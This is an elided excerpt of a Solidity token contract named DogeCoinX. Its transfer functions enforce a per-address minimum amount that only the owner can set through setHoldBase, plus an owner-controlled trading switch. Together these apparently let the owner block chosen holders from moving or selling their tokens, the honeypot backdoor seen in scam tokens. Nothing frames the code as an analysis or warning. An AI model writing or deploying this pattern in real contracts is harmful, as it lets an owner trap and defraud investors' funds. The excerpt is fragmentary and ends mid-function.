...
contract DogeCoinX is Context, Ownable, IERC20 {
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        require(amount >= _holdBase[_msgSender()], "DogeX: Transfer amount is less than the minimum allowed");
        require(_balances[_msgSender()] >= amount, "DogeX: transfer amount exceeds balance");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_activeTrade, "DogeX: Trading is currently disabled");
        require(amount >= _holdBase[sender], "DogeX: Hold lesser than minimum amount");
        require(_balances[sender] >= amount, "DogeX: transfer amount exceeds balance");
        require(_allowances[sender][_msgSender()] >= amount, "DogeX: transfer amount exceeds allowance");
    ...
    function setHoldBase(address account, uint256 newAmount) public onlyOwner {
        require(account != address(0), "DogeX: address zero is not a valid account");
